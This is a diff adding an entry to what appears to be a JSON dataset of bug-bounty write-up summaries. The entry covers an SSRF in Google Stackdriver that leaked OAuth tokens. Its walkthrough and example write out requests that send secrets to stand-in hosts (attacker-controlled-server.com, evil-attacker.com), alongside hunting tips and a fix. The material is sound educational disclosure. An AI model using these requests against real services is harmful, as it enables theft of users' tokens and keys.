@@ -1,5 +1,47 @@
 [
   {
+    "id": "6b4b11d8fa03",
+    "title": "The SSRF That Mailed Out Your OAuth Token",
+    "url": "https://masimshahzad.medium.com/the-ssrf-that-mailed-out-your-oauth-token-01327e8c1578",
+    "source": {
+      "slug": "medium-tag-bug-bounty",
+      "name": "Medium — #bug-bounty"
+    },
+    "authors": [
+      "Muhammad Asim Shahzad"
+    ],
+    "program": null,
+    "platform_slug": "self-disclosed",
+    "bounty_raw": null,
+    "published_at": "2026-11-07T15:27:42.000Z",
+    "added_at": "2026-11-07T15:52:11.394Z",
+    "categories": [
+      "ssrf",
+      "oauth-jwt",
+      "access-control"
+    ],
+    "severity": "high",
+    "difficulty": "intermediate",
+    "summary_en": "A vulnerability in Google Stackdriver allowed attackers to steal users' source-control OAuth tokens by exploiting an SSRF flaw in a repository branch-listing endpoint.",
+    "summary_ar": null,
+    "lesson": {
+      "cause": "The root cause was a design flaw where the server allowed the client to specify a full URL for a backend request while the server automatically attached the user's sensitive OAuth token to that request. Specifically, a helper endpoint for listing repository branches accepted a 'url' parameter without validating the destination. Because the endpoint also lacked CSRF protection, an attacker could force a victim's browser to trigger this request, sending the victim's private access token directly to an attacker-controlled server.",
+      "walkthrough": "RECON\n1. The researcher identified a feature in Google Stackdriver Debugger that allows users to link external source-control accounts like GitHub or Bitbucket via OAuth (a secure way to grant access without sharing passwords).\n2. While exploring the 'list branches' feature, the researcher observed an HTTP request (a message sent from your browser to a server) that fetched repository data.\n\nDISCOVERY\n3. The researcher noticed the request targeted a specific endpoint (a specific web address used by an application to perform a task) that accepted a full URL as a parameter (a piece of data provided in a request).\n4. The researcher suspected an SSRF (Server-Side Request Forgery), which is when an attacker tricks a server into making a request to a location the attacker chooses.\n\nEXPLOITATION\n5. The researcher set up a listener on a server they controlled to record incoming web traffic.\n6. The researcher crafted a request to the vulnerable Stackdriver endpoint, replacing the legitimate GitHub URL with their own malicious URL.\n7. Request: GET /v1/projects/project-id/repos/branches?url=http://attacker-controlled-server.com/\n8. Why: The researcher wanted to see if the Google server would fetch this arbitrary URL (the mechanism of SSRF).\n9. The Google backend server received the request and prepared to fetch the content from 'attacker-controlled-server.com'.\n10. Before sending the request, the backend 'helpfully' retrieved the victim's OAuth token (a secret digital key used to prove identity) from its database.\n11. The backend server then sent the request to the attacker's server, including the secret token in the Header (extra information sent with a request, often used for passwords).\n12. Header: Authorization: Bearer [SECRET_OAUTH_TOKEN]\n13. Why: The server was programmed to always attach the token when calling the 'url' parameter, assuming the URL would always be a trusted provider like GitHub.\n\nIMPACT\n14. The attacker's server logged the incoming request, including the Authorization header.\n15. The researcher now possessed the victim's private OAuth token, which could be used to access the victim's private code repositories and secrets.",
+      "example": "Imagine a website 'target.example' has a feature to 'Import Profile Picture from URL'. \n\nWhen you submit a URL, the server fetches it using this internal code:\n`response = requests.get(user_url, headers={'X-Internal-API-Key': 'SECRET123'})` \n\nAn attacker provides the URL: `http://evil-attacker.com/log`. \n\nThe server at 'target.example' makes a request to the attacker's site. The attacker checks their server logs and sees: \n`GET /log HTTP/1.1` \n`Host: evil-attacker.com` \n`X-Internal-API-Key: SECRET123` \n\nThe attacker has now stolen the server's internal API key because the server blindly attached a secret to a request directed at an untrusted destination.",
+      "takeaway": "When hunting for SSRF, don't just look for internal network access; look for what the server 'adds' to the request. If a server attaches headers, cookies, or tokens to an outbound request, try to point that request at a server you control to see if those secrets are leaked. Always check if URL parameters can be swapped for external domains. A common variant is 'Redirect-based leakage,' where a server sends a token to a trusted site, but that site redirects the request to an attacker's site, carrying the token along with it. Avoid the mistake of assuming that because an OAuth flow is 'standard,' the subsequent use of the token is secure.",
+      "fix": "To fix this, the server should never accept a full URL from the client. Instead, it should accept an identifier (like 'github' or 'bitbucket') and a project ID, then construct the URL itself using a hardcoded, trusted base. Additionally, the server must validate the final destination, disable automatic redirects to prevent token forwarding, and implement CSRF protection (like SameSite cookies) to prevent unauthorized triggering of the request.\n\nFixed Code Example:\nALLOWED_HOSTS = {'github': 'api.github.com', 'gitlab': 'gitlab.com'}\ndef get_branches(provider, project_id):\n  host = ALLOWED_HOSTS.get(provider)\n  if not host: raise Exception('Invalid Provider')\n  url = f'https://{host}/repos/{project_id}/branches'\n  token = get_token_from_db(user_id)\n  return requests.get(url, headers={'Authorization': f'Bearer {token}'}, allow_redirects=False)",
+      "cause_ar": null,
+      "walkthrough_ar": null,
+      "example_ar": null,
+      "takeaway_ar": null,
+      "fix_ar": null
+    },
+    "excerpt": "_AI disclosure: This article was drafted with AI assistance as an analytical case study of a public disclosure. It is not my own discovery._ Most SSRF stories chase internal metadata. Ron Chan reported one through Google VRP in which Stackdriver Debugger fetched a client-supplied URL and included the user’s linked source-control access token in that request. Google fixed it; the researcher noted he couldn’t bypass the fix. > **_Disclaimer:_**_Educational and defensive use only. Fixed in 2019. This article intentionally omits exploit requests. Test only within authorized scope._ ## Vulnerabilit",
+    "ai_generated": true,
+    "engagement": null,
+    "score": 53
+  },
+  {
     "id": "88b09cc9da6a",
     "title": "When OAuth Works Correctly and Security Doesn’t: A Bug in OAuth Account Linking",
     "url": "https://medium.com/@0xnexus0xfault0x/when-oauth-works-correctly-and-security-doesnt-a-bug-in-oauth-account-linking-7f24bfdf91f0",
